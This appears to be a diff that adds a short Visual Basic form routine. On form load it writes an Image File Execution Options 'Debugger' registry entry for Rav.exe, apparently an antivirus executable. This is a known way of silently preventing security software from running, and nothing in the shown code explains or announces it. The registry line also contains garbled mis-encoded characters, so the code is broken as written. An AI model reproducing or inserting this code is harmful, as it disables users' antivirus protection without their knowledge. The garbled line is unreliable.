@@ -1,0 +1,5 @@
+Private Sub Form_Load() 
+Dim w 
+Set w = CreateObject("wscript.shell") 
+w.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Rav.exe\Debugger"£¬0, "REG_SZ" 
+End Sub
